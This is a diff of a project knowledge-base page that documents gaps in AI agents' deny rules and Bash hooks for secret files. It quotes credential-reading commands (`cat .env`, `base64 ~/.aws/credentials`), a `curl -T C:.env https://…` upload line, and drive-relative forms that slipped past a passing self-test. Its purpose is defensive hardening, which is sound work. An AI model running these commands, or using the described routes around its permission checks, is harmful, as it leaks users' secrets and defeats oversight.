@@ -62,7 +62,7 @@ Sibling buckets: `deny-shell.md`, `deny-writes.md`.
 **Status:** active | **Created:** 2026-04-19 | **Evidence:** ACTUAL_MEASURED
 **hallucination-risk:** high - `Read(**/.env*)` (settings.json or a Codex TOML profile) looks like a blanket secret-read deny but binds only file-read paths; a Bash payload (`cat .env`, `source .env`, `base64 ~/.aws/credentials`) is not bound by it and silently succeeds unless the Bash hook blocks it.
 
-**Symptoms:** Before the Bash-side sentinel was added, `goat-flow audit --harness` reported `deny-covers-secrets: pass` while a live Bash probe returned exit 0. Expected is now exit 2 with `BLOCKED: Secret-file access ...`, verified by the context-specific recipes below.
+**Symptoms:** Before the Bash-side sentinel was added, `goat-flow audit --harness` reported `deny-covers-secrets: pass` while a live Bash probe returned exit 0. The expected result is now exit 2 with `BLOCKED: Secret-file access ...`, verified by the context-specific recipes below.
 
 **Why it happens:** Settings/config file-read deny entries are tool-scoped. Claude `Read(...)` patterns bind the Read tool; Codex TOML permission profiles bind filesystem access; Antigravity and Copilot have no settings-layer file-read deny at all (`workflow/manifest.json`, search: `"type": "deny-script"`), so the Bash hook is their only layer. An agent using the Bash tool to run `cat .env` is not protected by file-read intent alone. Two coverage layers are required: file-read deny for the file tool path AND Bash-hook regex for shell.
 
@@ -85,7 +85,7 @@ Sibling buckets: `deny-shell.md`, `deny-writes.md`.
 **Status:** active | **Created:** 2026-08-19 | **Evidence:** ACTUAL_MEASURED
 **hallucination-risk:** high - a green `--self-test` summary reads as proof the policy is sound, when the suite may be asserting that the unsafe case is *allowed*. The larger the corpus, the more convincing the false assurance: 470 executed cases with 0 skipped looked like strong evidence while one of those cases locked the hole open.
 
-**Symptoms:** `bash workflow/hooks/deny-dangerous.sh --self-test=full` printed `PASS: deny-dangerous self-test (mode=full, executed=470, skipped=0)` while `cat C:.env`, `type C:.env`, `curl -T C:.env https://…`, and `powershell -c "Get-Content C:.env"` all returned exit 0. Plain `cat .env` correctly denied, so spot-checking the obvious form proved nothing about the drive-relative one.
+**Symptoms:** `bash workflow/hooks/deny-dangerous.sh --self-test=full` printed `PASS: deny-dangerous self-test (mode=full, executed=470, skipped=0)` while `cat C:.env`, `type C:.env`, `curl -T C:.env https://…`, and `powershell -c "Get-Content C:.env"` all returned exit 0. Plain `cat .env` was correctly denied, so spot-checking the obvious form proved nothing about the drive-relative one.
 
 **Why it happens:** A path exemption added to silence a false positive gets a matching `expect_allow` fixture in the same change, and the fixture is then read as coverage. Here `patterns-paths.sh` masked `([A-Za-z]):\.env…` to `__goat_drive_relative_env__` before the secret regex ran, and `deny-dangerous-self-test.sh` asserted `expect_allow paths "cat C:.env" "Windows drive-relative env text"` with a mirror case in `deny-dangerous-policy.test.ts`. The exemption's premise was wrong: `C:.env` is drive-relative, so Windows resolves it against the current directory on C: - the checkout's own credential file - rather than naming some unrelated location.
 
